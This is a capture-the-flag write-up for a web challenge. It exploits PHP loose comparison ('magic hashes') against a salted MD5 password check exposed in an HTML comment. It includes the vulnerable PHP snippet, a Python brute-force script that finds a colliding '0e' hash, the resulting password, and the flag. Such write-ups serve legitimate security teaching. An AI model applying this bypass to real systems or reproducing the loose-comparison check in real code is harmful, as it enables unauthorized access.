# WM03
> 250pts

## Briefing
> Visit the site at https://cfta-wm03.allyourbases.co and find a way to bypass the password check.

## Solution
Going to the source page, we can see that the logic for the login is as below:
```html
<!--
        TODO: remove, taken from OSS project, login contains:
        return function ($event) {
            require_once("flag.php");
            $hash = "0e747135815419029880333118591372";
            $salt = "e361bfc569ba48dc";
            if (isset($event['password']) && is_string($event['password'])) {
                if (md5($salt . $event['password']) == $hash) {
                    return $flag;
                }
            }
            return "Incorrect";
        };
    -->
```

We can exploit the comparison ```==```. Essentially, we can find another hash starting with `0e` that will return true if compared using the ```==``` operator to the given hash. There is more information about this here: https://www.whitehatsec.com/blog/magic-hashes/.

Looking at the above logic, we can see that we need a password that when hashed using MD5 and the given salt, returns a hash that begins with `0e` and is 32 digits long, including the `0e`. Hashes cannot be reversed, so we can instead write a python script that will test hashes until we get the correct one (it takes a while so you might want to run it in the background):
```python
import hashlib

salt = "e361bfc569ba48dc"

i = 100000000

while 1:
    password = salt + str(i)
    password = password.encode('utf8')

    new_hash = hashlib.md5(password).hexdigest()
    if new_hash[0:2] == "0e" and new_hash[2:32].isdigit():
        print(password, str(i), new_hash)
        exit(0)
    i += 1
```
The output of the script is `b'e361bfc569ba48dc803544664' 803544664 0e664400602231670239629332728713`. We log in with `803544664` and get the flag.

## Flag
Flag: `theLOOSEtheMATH&theTRUTHY`
